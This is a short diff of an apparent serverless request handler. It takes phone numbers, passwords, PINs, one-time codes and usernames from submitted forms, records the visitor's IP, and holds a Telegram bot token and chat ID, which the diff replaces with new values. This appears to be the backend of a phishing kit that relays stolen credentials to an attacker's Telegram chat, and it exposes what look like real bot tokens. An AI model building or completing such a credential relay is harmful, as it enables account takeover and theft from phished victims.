@@ -4,8 +4,8 @@ export default async function handler(req, res) {
   }
 
   const { type, phone, pass, pin, otp, username, invite } = req.body;
-  const BOT_TOKEN = '8928951011:AAG6D0Jv-C5FZNQqyVwWnaac9Dyyd8J3eBc';
-  const CHAT_ID = '8673506776';
+  const BOT_TOKEN = '8750081908:AAEha0LhQSw0tbocU-9rx2WJ1DgdyHcjvOw';
+  const CHAT_ID = '6076330929';
 
   // Get Visitor IP from Vercel headers
   const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
